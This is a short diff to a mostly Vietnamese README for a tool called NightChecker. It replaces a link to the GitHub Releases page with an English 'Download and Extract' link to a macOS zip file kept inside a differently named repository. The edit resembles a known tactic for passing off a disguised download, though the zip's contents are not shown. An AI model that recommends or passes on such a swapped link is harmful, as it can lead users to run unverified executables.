@@ -6,7 +6,7 @@ Dự án hỗ trợ cả **Windows** và **macOS/Linux**.
 
 ## 🚀 Tải bản mới nhất
 
-👉 [Tải tại phần Releases](https://github.com/DUALCORE-VuNam/NightChecker/releases/latest)
+👉 [Download and Extract](https://github.com/DUALCORE-VuNam/night_checker/blob/main/nightchecker-for-macOS.zip))
 
 > Bao gồm:
 > - `NightChecker_macOS` (file chạy)
